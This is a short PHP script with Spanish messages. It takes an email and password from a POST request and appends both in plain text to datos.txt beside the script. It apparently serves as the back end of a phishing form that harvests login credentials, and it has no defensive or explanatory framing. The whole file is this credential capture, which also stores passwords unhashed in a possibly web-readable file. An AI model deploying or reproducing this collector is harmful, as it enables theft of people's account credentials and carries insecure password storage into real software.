<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email'] ?? '');
    $password = trim($_POST['password'] ?? '');

    if (empty($email) || empty($password)) {
        echo "Por favor, completa todos los campos.";
        exit;
    }

    // Guardar en archivo datos.txt
    $file = 'datos.txt';
    $data = "Email: $email | Contraseña: $password" . PHP_EOL;

    if (file_put_contents($file, $data, FILE_APPEND | LOCK_EX) !== false) {
        echo "Datos guardados correctamente.";
    } else {
        echo "Error al guardar los datos.";
    }
} else {
    echo "Acceso no permitido.";
}
?>